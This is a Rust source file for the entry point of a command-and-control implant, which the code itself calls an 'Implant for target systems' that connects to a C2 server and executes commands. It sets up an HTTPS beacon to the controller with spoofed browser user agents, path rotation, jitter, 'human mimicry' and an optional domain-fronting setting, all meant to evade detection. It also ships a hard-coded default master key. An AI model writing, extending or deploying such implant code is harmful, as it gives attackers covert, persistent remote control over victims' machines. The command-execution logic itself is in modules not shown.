//! C2 Agent - Implant for target systems
//!
//! Connects to C2 server and executes commands.

use std::sync::Arc;
use clap::Parser;
use tracing::info;
use uuid::Uuid;
use c2_system::protocols::{HttpsChannel, HttpsChannelConfig, C2Endpoint};
use c2_system::agent::{BeaconEngine, BeaconConfig};
use tokio::time::Duration;

#[derive(Parser, Debug)]
#[command(name = "c2-agent")]
#[command(about = "C2 Agent for remote command execution")]
struct Args {
    /// Agent name
    #[arg(short, long, default_value = "agent")]
    name: String,

    /// Agent ID (auto-generated if not provided)
    #[arg(long)]
    id: Option<String>,

    /// C2 server URL
    #[arg(short, long, default_value = "http://localhost:8080")]
    server: String,

    /// Master key for envelope encryption (must match the server)
    #[arg(long, default_value = "default_master_key")]
    master_key: String,

    /// Sleep interval in milliseconds
    #[arg(long, default_value = "60000")]
    sleep: u64,

    /// Jitter percentage (0.0 to 1.0)
    #[arg(long, default_value = "0.3")]
    jitter: f32,

    /// Log level
    #[arg(short, long, default_value = "info")]
    log_level: String,

    /// Run in daemon mode
    #[arg(long)]
    daemon: bool,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let args = Args::parse();

    // Initialize logging
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::from_default_env()
                .add_directive(format!("{}", args.log_level).parse()?)
        )
        .init();

    info!("Starting C2 Agent: {}", args.name);

    // Generate or use provided agent ID
    let agent_id = match &args.id {
        Some(id) => Uuid::parse_str(id)?,
        None => Uuid::new_v4(),
    };

    info!("Agent ID: {}", agent_id);

    // Configure HTTP channel
    let https_config = HttpsChannelConfig {
        endpoints: vec![C2Endpoint {
            url: args.server.clone(),
            priority: 1,
            weight: 1.0,
            method: "POST".to_string(),
            path: "/beacon".to_string(),
        }],
        user_agents: vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36".to_string(),
        ],
        headers: vec![],
        timeout_ms: 10000,
        connection_timeout_ms: 5000,
        tls_verify: true,
        domain_fronting: None,
        path_rotation: vec!["/beacon".to_string(), "/api/beacon".to_string()],
    };

    let channel: Arc<dyn c2_system::protocols::C2Channel + Send + Sync> =
        Arc::new(HttpsChannel::new(https_config));

    // Configure beacon engine
    let beacon_config = BeaconConfig {
        base_interval: Duration::from_millis(args.sleep),
        jitter_percent: args.jitter,
        human_mimicry: true,
        sleep_on_failure: true,
        max_retries: 5,
        initial_backoff: Duration::from_secs(5),
        max_backoff: Duration::from_secs(300),
        backoff_multiplier: 2.0,
        master_key: args.master_key,
    };

    let mut beacon_engine = BeaconEngine::new(
        beacon_config,
        agent_id,
        vec![channel.clone()],
    );

    info!("Connecting to C2 server...");

    // Run beacon loop
    beacon_engine.run().await?;

    info!("Agent stopped");

    Ok(())
}
